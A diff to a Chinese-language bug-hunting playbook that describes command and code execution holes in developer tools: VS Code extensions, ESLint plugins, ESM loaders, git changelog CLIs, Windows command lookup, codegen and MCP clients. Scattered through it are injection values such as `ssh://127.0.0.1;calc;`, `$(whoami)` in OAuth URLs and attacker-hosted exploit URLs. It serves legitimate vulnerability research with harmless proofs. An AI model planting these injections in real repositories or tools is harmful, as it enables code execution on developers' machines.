@@ -230,6 +230,7 @@ b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plu
 
 - JSON：`scheme://app/open?params={"url":"http://attacker","urlType":1}`
 - 扁平：`scheme://openUrl?url=http://attacker/exp.html`
+- 拼进 PTY：协议 URL 被当成 shell 一行打进当前终端再回车（`ssh://` 常见）。host/user 不转义。`ssh://127.0.0.1;calc;` 会变成 `ssh 127.0.0.1;calc;` 回车；`$()` / 反引号同样。openFile 做了 escapeshellcmd、openSSH 没做是对照。假点：只调起 ssh 连到那个 host、没有第二条命令。
 
 浏览器地址栏或任意 `href` 打开，系统会问「要打开该应用吗」——对方点一次就算合理交互，不需要中间人。
 
@@ -243,3 +244,111 @@ remote.require('child_process').exec('open -a Calculator');
 Windows 把命令换成 `calc`。预加载只露了 `ipcRenderer`、调不了命令 → 这条桥没打穿，别写成 RCE。
 
 算成：本机弹出计算器 / 执行了你指定的无害命令。只在浏览器 alert、客户端不渲、只弹「打开应用」但不加载外站、或跳了但没执行 → 停在调起/存储 XSS，别写成 RCE。协议只开自家域、`require` 和 `remote` 都没有 → 这条投递到此为止，改打投递 1 或网页面。
+
+### untrusted 漏 require（短表有指针）
+
+VS Code 语言扩展 `untrustedWorkspaces.limited`。广告说 untrusted 不加载用户 `node_modules` / 语言 config，语言服务 `isTrusted` 也闸了这些入口。还要看 **tsserver 插件** 是否 `require.resolve` 工作区编译器（`create()` 里 `enable=false` 仍走到 require 也算），以及 format/补全是否仍 `prettier.resolveConfig`（会执行 `prettier.config.js`）。
+
+未信任工作区放假 `node_modules/<lang>/compiler` 或 `prettier.config.js`，payload 写无害命令到 marker。对照：闸了的 config 入口不应跑。
+
+算成：本机当前用户跑了指定无害命令。假点：restrictedConfigurations 已挡住这条 require；只在 trusted 工作区加载；扩展不支持 untrusted。这和「公网 VS Code 读进程环境」不是同一套。
+
+### lint 预处理器 require（短表有指针）
+
+ESLint 语言插件的 recommended 为了对 `svelte-ignore` / `valid-compile` 去跑编译，把 `<style lang="stylus|less">` **原文**丢给 `stylus.render` / `less.render`。stylus `use()`、less `@plugin` 会 require 工作区 JS。
+
+工程能 `require('stylus')` 或 `require('less')` 时，lint 一份带 ignore 的文件即可。对照：去掉 ignore、规则不再编译时不应写 marker。
+
+算成：`npx eslint` 当下本机当前用户跑了无害命令。假点：没装预处理器；recommended 且没有 ignore 也没开会强制编译的规则；plugin 被关掉。这和「untrusted 漏 require」不是同一套（那是 VS Code isTrusted，这是 CLI lint）。
+
+### register 把 json 当 JS（短表有指针）
+
+自定义 ESM load hook 看见 `.json` 就把原文拼进 `export default ${rawSource}`（或 CJS `module.exports =`）并 `shortCircuit`。`with { type: "json" }` 也不走 Node 的 JSON.parse。
+
+`node --import <loader>/register` 之后，工程里当数据 import 的 json（配置/文案/依赖 json）可以改成脚本。对照：同一入口同一文件，不带 register 应 Unexpected token。
+
+算成：本机当前用户跑了无害命令。假点：库自己的 `createJiti().import` / CLI 已 JSON.parse；文件是合法 JSON 只当数据。这和 untrusted require、lint 预处理器 require 不是同一套。
+
+### JSON 伪造代理 AST（短表有指针）
+
+代码生成库用字符串哨兵（`__magicast_proxy` 一类）标记内部 Proxy。`literalToAst` 看见这个键就把 `$ast` 当 AST 打进产物。JSON 能带同一哨兵，赋值 / 深合并 / `array.push` 都会走。
+
+不可信 JSON 赋进 proxified 配置再 `generateCode` / import。对照：普通 `{foo:1}` 生成数据对象、import 不跑命令。
+
+算成：生成文件被加载后本机当前用户跑了无害命令。假点：`builders.raw` 文档就是塞源码；调用方自己拿真实 Proxy。这和 register 把 json 当 JS 不是同一套。
+
+### git ref 拼进 shell（短表有指针）
+
+changelog/git CLI 用 `git describe --tags` 取出 tag 名，再双引号拼进 `execSync("git log \"${from}...${to}\"")`。开发者以为双引号够了；POSIX `/bin/sh -c` 里 `$()` / 反引号仍执行。git 允许 tag 含 `$()`，空格用 `${IFS}`。
+
+发版 CLI 若 import 了 spawn 却把 changeset 说明 / GitHub owner / 基线分支同样双引号拼进 `gh pr create`，同一枪：`-m` / AI 生成说明或 config.owner。owner 连引号都不转时 Windows cmd 可 `"` 断句 `&whoami`。
+
+不传 `--from`，仓库里放恶意 tag，无参跑工具。对照：同一句在 Windows cmd.exe 不展开 `$()`；simple-git 数组 spawn 不扩。
+
+算成：whoami 进 git 报错或 marker 文件落地。假点：Windows cmd 不扩 `$()`；只有调用方自己敲 `--from` 是自己打自己；`execFile`/spawn 数组传参。这和自定义协议 URL 拼 PTY、JSON 当 JS 不是同一套。
+
+### PATHEXT cwd 抢 exe（短表有指针）
+
+Windows 进程库自己按 PATHEXT 搜命令，把 **cwd** 放进搜索最前，cwd 里的 `node.cmd` 压过 PATH 上的 `node.exe`，再把短名丢给 `cmd.exe /c`。Node `child_process.spawn('node')` 不会这样。
+
+另一枪：`execSync("which <bin>")` 整句走 cmd.exe，种的是 **`which.cmd`** 不是目标 bin.cmd。`existsSync(homedir+"/.bun/bin/bun")` 不认旁边的 `.exe` 时必落到 which。
+
+工程目录种同名 cmd 或 `which.cmd`。对照：同一目录 Node spawn 仍跑真 node / ENOENT。
+
+算成：种植脚本 whoami/marker。假点：库不搜 PATHEXT、也不 `execSync("which …")`；spawn 已走 exe。这和 untrusted require、git ref 拼 shell 不是同一套。
+
+### packageManager 当 exe（短表有指针）
+
+本机包管理封装 `detectPackageManager().name` 直接 `execa(name, [subcommand])`，不走 corepack / 白名单。`package.json` 的 `packageManager` 字段就是二进制名。
+
+`packageManager: "node@18.0.0"`，工程里放与官方硬编码子命令同名的 `upgrade.js` / `install.js`。对照：拿掉 js 应 MODULE_NOT_FOUND。Windows 上检测成 npm 时 cwd `npm.cmd` 也会被这句 execa 跑起来。
+
+算成：whoami/marker。假点：走了 nypm `executeCommand` 且 corepack 拦住未知 PM；二进制名是调用方自己 argv。这和 PATHEXT cwd 抢 exe 不是同一套（那边是种 cmd 抢 PATH，这边是字段名当 exe）。
+
+### lang 拼相对 import（短表有指针）
+
+预处理器把 `<style lang>` / `<script lang>` 无白名单拼进 `import(\`./transformers/${lang}.js\`)`。`lang` 不是枚举名，是相对模块路径。
+
+`lang=\`../../../../evil\`` 指向仓库 JS，默认 preprocess/构建就会加载。对照：乱填不存在的路径只报 Cannot find module。
+
+算成：execSync whoami/marker。假点：lang 有白名单；只是 less `@plugin` / stylus `use()`（那是「lint 预处理器 require」）；调用方自己注册的自定义语言。这和 lint 预处理器 require 不是同一套。
+
+### playground 文件名穿越（短表有指针）
+
+脚手架把远程 playground/repl JSON 的 `file.name` 无 jail 拼进 `path.join(cwd, 固定子目录, name)`，create 再对本项目 `npm/pnpm install`。
+
+`../package.json` 覆盖 `preinstall`，install 钩子跑起来。对照：官方内置模板不走这份 JSON；社区 tar unpack 若拒 `..` 则不是这枪。
+
+算成：钩子 whoami/marker。假点：只写到子目录内；调用方自己的本地路径 argv。这和 git ref 拼 shell、lang 拼相对 import 不是同一套。
+
+### wasm 导出名拼绑定（短表有指针）
+
+构建期 wasm（或同类二进制接口节）绑定生成器 `parse` 出导出名后拼进 `export const ${name} = _mod.${name}` / `obj["${name}"]`，不当 JS 标识符消毒。
+
+文档用法挂插件打包 `.wasm`，导出名写成语句（writeFileSync + execSync），加载产物。对照：合法导出名 `ok` 产物没有 execSync。
+
+算成：whoami/marker。假点：调用方自己把名字喂给代码生成 API；解析失败已回退 Module、产物里没有那句。这和 register 把 json 当 JS、knitwork 调用方传入 names 不是同一套。
+
+### JSDoc 注释闭合（短表有指针）
+
+schema/codegen 把文档注释原文按行加 `* ` 包进 `/** */`，不转义 `*/`。注释里的 `*/` 提前结束 JSDoc，后面的 `Function` / `import()` 进生成文件顶层。
+
+生成文件被工程 import。对照：普通 hello 注释产物没有 Function，import 不写 marker。
+
+算成：whoami/marker。假点：注释被 escape；生成后只当文本从不执行；编译因类型错误没写出文件。这和 JSON 伪造代理 AST、register 把 json 当 JS 不是同一套。
+
+### 生成包装注释打断（短表有指针）
+
+MCP/代码生成器把服务端 `tool.name` 写进生成 TS 的 `// Auto-generated wrapper for MCP tool: ${name}`，文件名/标识符另做 `[A-Za-z0-9_]` 消毒，注释行仍写原名。换行打断 `//`，后面的 `import`/`execSync` 变成顶层语句。
+
+按文档 import 生成包装。对照：合法工具名产物没有 execSync。
+
+算成：whoami/marker。假点：注释也 escape 了；生成后从不被加载。这和 JSDoc `*/` 闭合、wasm 导出名拼绑定不是同一套。
+
+### OAuth URL 拼进 open（短表有指针）
+
+MCP 客户端把 OAuth `authorization_endpoint` 原样拼进 `open "URL"` / `xdg-open "URL"` 再 `child_process.exec`。WHATWG 序列化不吃 `$()`，双引号挡不住 POSIX 展开。
+
+well-known 元数据里填 `http://127.0.0.1/$(whoami)`。对照：Windows `start "URL"` 把整段当窗口标题、cmd 不扩。
+
+算成：POSIX whoami/marker。假点：Windows cmd 不扩；URL 被白名单/编码吃掉 `$()`。这和 git ref 拼 `git log` 不是同一套（那边是 tag，这边是 OAuth 发现 URL 进 open）。
